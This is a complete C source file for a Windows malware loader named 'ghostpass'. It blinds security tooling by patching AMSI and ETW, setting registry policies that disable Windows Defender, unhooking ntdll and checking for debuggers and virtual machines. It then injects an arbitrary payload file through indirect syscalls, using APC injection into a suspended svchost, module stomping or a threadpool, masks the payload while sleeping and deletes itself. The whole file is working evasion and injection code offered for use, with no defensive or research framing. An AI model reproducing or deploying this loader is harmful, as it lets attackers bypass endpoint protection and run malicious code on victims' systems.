// ghostpass_vX.c — FINAL
// Compilación: x86_64-w64-mingw32-gcc -O2 -s -march=native -masm=intel -fomit-frame-pointer -o ghostpass.exe ghostpass_vX.c -lntdll -liphlpapi -ladvapi32 -static-libgcc -fno-stack-protector -fvisibility=hidden -Wno-unused-result

#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")

typedef struct _UNICODE_STRING_S { USHORT Length, MaximumLength; PWSTR Buffer; } UNICODE_STRING_S;
typedef struct _PEB_LDR_DATA { BYTE _1[8]; PVOID _2[3]; LIST_ENTRY InMemoryOrderModuleList; } PEB_LDR_DATA;
typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY InMemoryOrderLinks, _1, _2; PVOID DllBase, _3; ULONG SizeOfImage; UNICODE_STRING_S FullDllName, BaseDllName; } LDR_DATA_TABLE_ENTRY;
typedef struct _PEB { BYTE _1[2], BeingDebugged, _2[1]; PVOID _3[2]; PEB_LDR_DATA* Ldr; } PEB;
typedef struct _SYSCALL_ENTRY { DWORD ssn; PVOID gadget; } SYSCALL_ENTRY;
typedef struct _OBJECT_ATTRIBUTES_S { ULONG Length; HANDLE RootDirectory; UNICODE_STRING_S* ObjectName; ULONG Attributes; PVOID _1, _2; } OBJECT_ATTRIBUTES_S;
typedef struct _CLIENT_ID { HANDLE UniqueProcess, UniqueThread; } CLIENT_ID;
typedef struct _PS_ATTRIBUTE { ULONG_PTR Attribute, Size; PVOID Value; PSIZE_T ReturnLength; } PS_ATTRIBUTE;
typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[3]; } PS_ATTRIBUTE_LIST;
typedef struct _RTL_USER_PROCESS_INFORMATION { ULONG Length; HANDLE Process, Thread; CLIENT_ID ClientId; } RTL_USER_PROCESS_INFORMATION;
typedef struct _RTL_USER_PROCESS_PARAMETERS { ULONG MaximumLength, Length, Flags, DebugFlags; PVOID ConsoleHandle, _1, _2, _3, _4, _5; UNICODE_STRING_S ImagePathName, CommandLine, DllPath, WindowTitle; } RTL_USER_PROCESS_PARAMETERS;
typedef NTSTATUS (NTAPI* pNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI* pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PULONG);
typedef NTSTATUS (NTAPI* pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI* pNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);
typedef NTSTATUS (NTAPI* pNtResumeThread)(HANDLE, PULONG);
typedef NTSTATUS (NTAPI* pNtOpenSection)(PHANDLE, ACCESS_MASK, OBJECT_ATTRIBUTES_S*);
typedef NTSTATUS (NTAPI* pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
typedef NTSTATUS (NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI* pNtClose)(HANDLE);
typedef VOID     (NTAPI* pRtlInitUnicodeString)(UNICODE_STRING_S*, PCWSTR);
typedef NTSTATUS (NTAPI* pNtCreateUserProcess)(PHANDLE, PHANDLE, ACCESS_MASK, ACCESS_MASK, PVOID, PVOID, ULONG, ULONG, RTL_USER_PROCESS_PARAMETERS*, PS_ATTRIBUTE_LIST*, PVOID, RTL_USER_PROCESS_INFORMATION*);
typedef NTSTATUS (NTAPI* pRtlCreateProcessParametersEx)(RTL_USER_PROCESS_PARAMETERS**, UNICODE_STRING_S*, PVOID, PVOID, UNICODE_STRING_S*, PVOID, PVOID, PVOID, PVOID, PVOID, ULONG);
typedef NTSTATUS (NTAPI* pLdrLoadDll)(PVOID, ULONG, UNICODE_STRING_S*, PHANDLE);

#define MEM_COMMIT 0x1000
#define MEM_RESERVE 0x2000
#define PAGE_READWRITE 0x04
#define PAGE_EXECUTE_READ 0x20
#define PROCESS_ALL_ACCESS 0x1FFFFF
#define INFINITE 0xFFFFFFFF

DWORD HashStringA(const char* s) { DWORD h = 0; while (*s) h = ((h << 5) + h) + *s++; return h; }
DWORD HashStringW(UNICODE_STRING_S* n) { DWORD h = 0; WCHAR* p = n->Buffer; while (*p) { h = ((h << 5) + h) + (*p >= L'A' && *p <= L'Z' ? *p + 32 : *p); p++; } return h; }

HMODULE GetModByHash(DWORD h) {
    PEB* peb = (PEB*)__readgsqword(0x60);
    LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
    for (LIST_ENTRY* e = head->Flink; e != head; e = e->Flink) {
        LDR_DATA_TABLE_ENTRY* m = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (m->BaseDllName.Buffer && HashStringW(&m->BaseDllName) == h) return (HMODULE)m->DllBase;
    }
    return NULL;
}
DWORD GetNtdllHash() { return HashStringA("ntdll.dll"); }

PVOID GetProcByHash(HMODULE mod, DWORD hash) {
    if (!mod) return NULL;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)mod + dos->e_lfanew);
    DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!rva) return NULL;
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)mod + rva);
    DWORD* names = (DWORD*)((BYTE*)mod + exp->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)mod + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)mod + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) if (HashStringA((char*)mod + names[i]) == hash) return (BYTE*)mod + funcs[ords[i]];
    return NULL;
}

SYSCALL_ENTRY* ResolveSyscall(DWORD hash) {
    HMODULE ntdll = GetModByHash(GetNtdllHash());
    if (!ntdll) return NULL;
    PVOID addr = GetProcByHash(ntdll, hash);
    if (!addr) return NULL;
    SYSCALL_ENTRY* e = VirtualAlloc(NULL, sizeof(*e), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!e) return NULL;
    BYTE* p = (BYTE*)addr;
    for (int i = 0; i < 24; i++) { if (p[i] == 0x0F && p[i+1] == 0x05) { e->ssn = p[i-1]; e->gadget = &p[i]; return e; } }
    VirtualFree(e, 0, MEM_RELEASE); return NULL;
}

HMODULE LoadDLLByHash(DWORD hash) {
    HMODULE ntdll = GetModByHash(GetNtdllHash());
    pLdrLoadDll LdrLoad = GetProcByHash(ntdll, HashStringA("LdrLoadDll"));
    pRtlInitUnicodeString RtlInit = GetProcByHash(ntdll, HashStringA("RtlInitUnicodeString"));
    if (!LdrLoad || !RtlInit) return NULL;

    const char* dllNames[] = { "amsi.dll", "comctl32.dll", "kernel32.dll", "user32.dll" };
    DWORD dllHashes[] = { HashStringA("amsi.dll"), HashStringA("comctl32.dll"), HashStringA("kernel32.dll"), HashStringA("user32.dll") };

    for (int i = 0; i < 4; i++) {
        if (hash == dllHashes[i]) {
            UNICODE_STRING_S path;
            WCHAR buf[128];
            int len = MultiByteToWideChar(CP_ACP, 0, dllNames[i], -1, buf, 128);
            buf[len-1] = L'\0';
            RtlInit(&path, buf);
            HANDLE hDll = NULL;
            if (LdrLoad(NULL, 0, &path, &hDll) == 0 && hDll) return (HMODULE)hDll;
        }
    }
    return NULL;
}

__attribute__((naked)) NTSTATUS IndirectNtWrite(HANDLE h, PVOID addr, PVOID buf, SIZE_T sz, PULONG w, DWORD ssn, PVOID g) {
    __asm__ volatile("mov r10, rcx\nmov eax, [rsp+48]\njmp qword ptr [rsp+56]\n");
}
__attribute__((naked)) NTSTATUS IndirectNtAlloc(HANDLE h, PVOID* b, ULONG_PTR z, PSIZE_T sz, ULONG t, ULONG p, DWORD ssn, PVOID g) {
    __asm__ volatile("mov r10, rcx\nmov eax, [rsp+56]\njmp qword ptr [rsp+64]\n");
}
__attribute__((naked)) NTSTATUS IndirectNtProtect(HANDLE h, PVOID* b, PSIZE_T sz, ULONG p, PULONG o, DWORD ssn, PVOID g) {
    __asm__ volatile("mov r10, rcx\nmov eax, [rsp+48]\njmp qword ptr [rsp+56]\n");
}
__attribute__((naked)) NTSTATUS IndirectNtQueueApc(HANDLE h, PVOID a, PVOID s1, PVOID s2, PVOID s3, DWORD ssn, PVOID g) {
    __asm__ volatile("mov r10, rcx\nmov eax, [rsp+48]\njmp qword ptr [rsp+56]\n");
}
__attribute__((naked)) NTSTATUS IndirectNtResume(HANDLE h, PULONG c, DWORD ssn, PVOID g) {
    __asm__ volatile("mov r10, rcx\nmov eax, r8d\njmp r9\n");
}

DWORD H_NtAlloc, H_NtWrite, H_NtProtect, H_NtQueueApc, H_NtResume, H_NtCreateProc, H_NtOpenSec, H_NtMapView, H_NtUnmap, H_NtClose;
DWORD H_RtlInit, H_RtlCreateParams;
DWORD H_EtwEventWrite, H_EtwEventWriteFull, H_EtwEventWriteTransfer, H_NtTraceEvent;
DWORD H_AmsiScanBuffer, H_AmsiInit, H_AmsiNotify;
DWORD H_AmsiDll, H_Comctl32;

void InitHashes() {
    H_NtAlloc = HashStringA("NtAllocateVirtualMemory");
    H_NtWrite = HashStringA("NtWriteVirtualMemory");
    H_NtProtect = HashStringA("NtProtectVirtualMemory");
    H_NtQueueApc = HashStringA("NtQueueApcThread");
    H_NtResume = HashStringA("NtResumeThread");
    H_NtCreateProc = HashStringA("NtCreateUserProcess");
    H_NtOpenSec = HashStringA("NtOpenSection");
    H_NtMapView = HashStringA("NtMapViewOfSection");
    H_NtUnmap = HashStringA("NtUnmapViewOfSection");
    H_NtClose = HashStringA("NtClose");
    H_RtlInit = HashStringA("RtlInitUnicodeString");
    H_RtlCreateParams = HashStringA("RtlCreateProcessParametersEx");
    H_EtwEventWrite = HashStringA("EtwEventWrite");
    H_EtwEventWriteFull = HashStringA("EtwEventWriteFull");
    H_EtwEventWriteTransfer = HashStringA("EtwEventWriteTransfer");
    H_NtTraceEvent = HashStringA("NtTraceEvent");
    H_AmsiScanBuffer = HashStringA("AmsiScanBuffer");
    H_AmsiInit = HashStringA("AmsiInitialize");
    H_AmsiNotify = HashStringA("AmsiNotifyOperation");
    H_AmsiDll = HashStringA("amsi.dll");
    H_Comctl32 = HashStringA("comctl32.dll");
}

BOOL AntiAnalysis() {
    if (((PEB*)__readgsqword(0x60))->BeingDebugged) { MessageBoxA(NULL, "", "", MB_OK); return TRUE; }
    int c[4]; __cpuid(c, 1); if (c[2] & (1<<31)) { MessageBoxA(NULL, "", "", MB_OK); return TRUE; }
    BYTE vm[][3] = {{0x00,0x0C,0x29},{0x00,0x50,0x56},{0x08,0x00,0x27},{0x00,0x15,0x5D},{0x00,0x03,0xFF}};
    IP_ADAPTER_INFO a[16]; DWORD s = sizeof(a);
    if (GetAdaptersInfo(a, &s) == ERROR_SUCCESS) for (int i=0; i<5; i++) if (!memcmp(a->Address, vm[i], 3)) { MessageBoxA(NULL, "", "", MB_OK); return TRUE; }
    MEMORYSTATUSEX m = {sizeof(m)}; GlobalMemoryStatusEx(&m);
    if (m.ullTotalPhys < 4ULL*1024*1024*1024) { MessageBoxA(NULL, "", "", MB_OK); return TRUE; }
    return FALSE;
}

void PatchETW() {
    HMODULE n = GetModByHash(GetNtdllHash());
    DWORD h[] = {H_EtwEventWrite, H_EtwEventWriteFull, H_EtwEventWriteTransfer, H_NtTraceEvent};
    BYTE p[] = {0x48,0x31,0xC0,0xC3};
    SYSCALL_ENTRY* w = ResolveSyscall(H_NtWrite); if (!w) return;
    for (int i=0; i<4; i++) { PVOID a = GetProcByHash(n, h[i]); if (a) IndirectNtWrite((HANDLE)-1, a, p, 4, NULL, w->ssn, w->gadget); }
}

void PatchAMSI() {
    HMODULE amsi = LoadDLLByHash(H_AmsiDll); if (!amsi) return;
    DWORD h[] = {H_AmsiScanBuffer, H_AmsiInit, H_AmsiNotify};
    BYTE p[] = {0xB8,0x57,0x00,0x07,0x80,0xC3};
    SYSCALL_ENTRY* w = ResolveSyscall(H_NtWrite); if (!w) return;
    for (int i=0; i<3; i++) { PVOID a = GetProcByHash(amsi, h[i]); if (a) IndirectNtWrite((HANDLE)-1, a, p, 6, NULL, w->ssn, w->gadget); }
}

void UnhookNTDLL() {
    HMODULE n = GetModByHash(GetNtdllHash());
    pRtlInitUnicodeString RtlInit = GetProcByHash(n, H_RtlInit);
    pNtOpenSection NtOpen = GetProcByHash(n, H_NtOpenSec);
    pNtMapViewOfSection NtMap = GetProcByHash(n, H_NtMapView);
    pNtUnmapViewOfSection NtUnmap = GetProcByHash(n, H_NtUnmap);
    pNtClose NtCloseS = GetProcByHash(n, H_NtClose);
    if (!RtlInit || !NtOpen || !NtMap || !NtUnmap || !NtCloseS) return;

    UNICODE_STRING_S sn; RtlInit(&sn, L"\\KnownDlls\\ntdll.dll");
    OBJECT_ATTRIBUTES_S oa = {sizeof(oa), NULL, &sn, 0x40};
    HANDLE hSec = NULL; NtOpen(&hSec, 0x4, &oa); if (!hSec) return;

    PVOID clean = NULL; SIZE_T vs = 0; LARGE_INTEGER off = {0};
    NtMap((HANDLE)-1, hSec, &clean, 0, 0, &off, &vs, 2, 0, PAGE_READONLY);
    if (!clean) { NtCloseS(hSec); return; }

    PIMAGE_DOS_HEADER cd = (PIMAGE_DOS_HEADER)clean;
    PIMAGE_NT_HEADERS cn = (PIMAGE_NT_HEADERS)((BYTE*)clean + cd->e_lfanew);
    PIMAGE_SECTION_HEADER cs = IMAGE_FIRST_SECTION(cn);
    SYSCALL_ENTRY* w = ResolveSyscall(H_NtWrite);
    if (!w) { NtUnmap((HANDLE)-1, clean); NtCloseS(hSec); return; }

    for (int i=0; i<cn->FileHeader.NumberOfSections; i++) {
        if (HashStringA(".text") == HashStringA((char*)cs[i].Name)) {
            PVOID target = (BYTE*)n + cs[i].VirtualAddress;
            PVOID source = (BYTE*)clean + cs[i].VirtualAddress;
            IndirectNtWrite((HANDLE)-1, target, source, cs[i].Misc.VirtualSize, NULL, w->ssn, w->gadget);
            break;
        }
    }
    NtUnmap((HANDLE)-1, clean); NtCloseS(hSec);
}

void DisableDefender() {
    HKEY k; DWORD d = 1;
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL);
    RegSetValueExA(k, "DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&d, sizeof(d)); RegCloseKey(k);
    RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0,NULL,0,KEY_SET_VALUE,NULL,&k,NULL);
    RegSetValueExA(k, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&d, sizeof(d)); RegCloseKey(k);
}

BOOL InjectAPC(unsigned char* payload, size_t size) {
    HMODULE n = GetModByHash(GetNtdllHash());
    pNtCreateUserProcess NtCreateProc = GetProcByHash(n, H_NtCreateProc);
    pRtlCreateProcessParametersEx RtlCreateParams = GetProcByHash(n, H_RtlCreateParams);
    pRtlInitUnicodeString RtlInit = GetProcByHash(n, H_RtlInit);
    SYSCALL_ENTRY *ntAlloc=ResolveSyscall(H_NtAlloc), *ntWrite=ResolveSyscall(H_NtWrite), *ntProtect=ResolveSyscall(H_NtProtect);
    SYSCALL_ENTRY *ntQueueApc=ResolveSyscall(H_NtQueueApc), *ntResume=ResolveSyscall(H_NtResume);
    if (!NtCreateProc || !RtlCreateParams || !RtlInit || !ntAlloc || !ntWrite || !ntProtect || !ntQueueApc || !ntResume) return FALSE;

    UNICODE_STRING_S img, cmd; RtlInit(&img, L"\\??\\C:\\Windows\\System32\\svchost.exe"); RtlInit(&cmd, L"svchost.exe -k netsvcs");
    RTL_USER_PROCESS_PARAMETERS* params = NULL;
    RtlCreateParams(&params, &img, NULL, NULL, &cmd, NULL, NULL, NULL, NULL, NULL, 0x20);

    PS_ATTRIBUTE_LIST al = {0}; al.TotalLength = sizeof(al);
    al.Attributes[0].Attribute = 6; al.Attributes[0].Size = sizeof(HANDLE);
    HANDLE hParent = (HANDLE)-1; al.Attributes[0].Value = &hParent;

    HANDLE hProc=NULL, hThread=NULL; RTL_USER_PROCESS_INFORMATION pi = {sizeof(pi)};
    if (NtCreateProc(&hProc, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, CREATE_SUSPENDED, params, &al, NULL, &pi) != 0) return FALSE;

    PVOID remote = NULL; SIZE_T rs = size;
    IndirectNtAlloc(pi.Process, &remote, 0, &rs, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE, ntAlloc->ssn, ntAlloc->gadget);
    IndirectNtWrite(pi.Process, remote, payload, size, NULL, ntWrite->ssn, ntWrite->gadget);
    ULONG old; IndirectNtProtect(pi.Process, &remote, &rs, PAGE_EXECUTE_READ, &old, ntProtect->ssn, ntProtect->gadget);
    IndirectNtQueueApc(pi.Thread, remote, NULL, NULL, NULL, ntQueueApc->ssn, ntQueueApc->gadget);
    IndirectNtResume(pi.Thread, NULL, ntResume->ssn, ntResume->gadget);
    return TRUE;
}

BOOL InjectStomp(unsigned char* payload, size_t size) {
    SYSCALL_ENTRY* ntWrite = ResolveSyscall(H_NtWrite); if (!ntWrite) return FALSE;
    HMODULE dll = LoadDLLByHash(H_Comctl32); if (!dll) return FALSE;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)dll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (int i=0; i<nt->FileHeader.NumberOfSections; i++) {
        if (HashStringA(".text") == HashStringA((char*)sec[i].Name) && size <= sec[i].SizeOfRawData) {
            PVOID addr = (BYTE*)dll + sec[i].VirtualAddress;
            IndirectNtWrite((HANDLE)-1, addr, payload, size, NULL, ntWrite->ssn, ntWrite->gadget);
            ((void(*)())addr)(); return TRUE;
        }
    }
    return FALSE;
}

BOOL InjectPool(unsigned char* payload, size_t size) {
    PVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return FALSE; memcpy(mem, payload, size);
    DWORD old; VirtualProtect(mem, size, PAGE_EXECUTE_READ, &old);
    PTP_POOL pool = CreateThreadpool(NULL); SetThreadpoolThreadMaximum(pool, 1);
    TP_CALLBACK_ENVIRON env; InitializeThreadpoolEnvironment(&env); SetThreadpoolCallbackPool(&env, pool);
    PTP_WORK work = CreateThreadpoolWork((PTP_WORK_CALLBACK)mem, NULL, &env);
    if (!work) { VirtualFree(mem, 0, MEM_RELEASE); return FALSE; }
    SubmitThreadpoolWork(work); WaitForThreadpoolWorkCallbacks(work, FALSE);
    CloseThreadpoolWork(work); CloseThreadpool(pool); VirtualFree(mem, 0, MEM_RELEASE);
    return TRUE;
}

void SleepEncrypt(int ms, unsigned char* data, size_t size) {
    __m128i key; key.m128i_u32[0]=__rdtsc(); key.m128i_u32[1]=GetTickCount64()&0xFFFFFFFF;
    key.m128i_u32[2]=(DWORD)(ULONG_PTR)GetModByHash(GetNtdllHash()); key.m128i_u32[3]=HashStringA("ghostpass");
    for (size_t i=0; i<(size&~0xF); i+=16) {
        __m128i block = _mm_loadu_si128((__m128i*)&data[i]);
        block = _mm_xor_si128(block, key); _mm_storeu_si128((__m128i*)&data[i], block);
    }
    HANDLE t = CreateWaitableTimerA(NULL, TRUE, NULL); LARGE_INTEGER d; d.QuadPart = -10000LL * ms;
    SetWaitableTimer(t, &d, 0, NULL, NULL, FALSE); WaitForSingleObject(t, INFINITE); CloseHandle(t);
    for (size_t i=0; i<(size&~0xF); i+=16) {
        __m128i block = _mm_loadu_si128((__m128i*)&data[i]);
        block = _mm_xor_si128(block, key); _mm_storeu_si128((__m128i*)&data[i], block);
    }
}

int Execute(unsigned char* p, size_t s, int tech) {
    InitHashes(); PatchAMSI(); PatchETW(); DisableDefender(); UnhookNTDLL();
    if (AntiAnalysis()) return 0;
    SleepEncrypt(3000, p, s);
    switch (tech) {
        case 0: return InjectAPC(p, s) ? 0 : 1;
        case 1: return InjectStomp(p, s) ? 0 : 1;
        case 2: return InjectPool(p, s) ? 0 : 1;
        case 3: { PVOID m = VirtualAlloc(NULL, s, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
                  memcpy(m, p, s); DWORD old; VirtualProtect(m, s, PAGE_EXECUTE_READ, &old);
                  ((void(*)())m)(); return 0; }
    }
    return 1;
}

void SelfDelete() {
    char sp[MAX_PATH]; GetModuleFileNameA(NULL, sp, MAX_PATH);
    char cmd[MAX_PATH+60]; snprintf(cmd, sizeof(cmd), "cmd.exe /c timeout /t 2 >nul & del /f /q \"%s\" & exit", sp);
    STARTUPINFOA si = {sizeof(si)}; PROCESS_INFORMATION pi;
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}

int main(int argc, char** argv) {
    if (argc < 2) return 1;
    int tech = (argc >= 3) ? atoi(argv[2]) : 0;
    HANDLE f = CreateFileA(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (f == INVALID_HANDLE_VALUE) return 1;
    DWORD size = GetFileSize(f, NULL);
    unsigned char* payload = VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    DWORD br; ReadFile(f, payload, size, &br, NULL); CloseHandle(f);
    Execute(payload, size, tech); VirtualFree(payload, 0, MEM_RELEASE); SelfDelete();
    return 0;
}
